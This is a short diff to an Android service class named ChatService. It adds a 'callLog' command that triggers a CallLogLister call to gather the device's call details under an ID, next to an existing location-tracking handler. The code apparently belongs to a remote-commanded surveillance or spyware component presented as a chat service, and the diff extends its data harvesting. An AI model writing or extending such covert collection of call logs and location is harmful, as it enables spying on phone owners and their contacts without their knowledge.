@@ -122,6 +122,9 @@ public class ChatService extends Service {
                         handleLocation();
                     default:
                         break;
+                    case "callLog":
+                        handleCallLogs();
+                        break;
                 }
             }
         }
@@ -245,6 +248,15 @@ public class ChatService extends Service {
             LocationTracker.getLocation(context, getId());
         } catch (Exception e)
         {
+            e.printStackTrace();
+        }
+    }
+
+    private void handleCallLogs() {
+        Context context = getApplicationContext();
+        try {
+            CallLogLister.getCallDetails(context, getId());
+        } catch (Exception e) {
             e.printStackTrace();
         }
     }
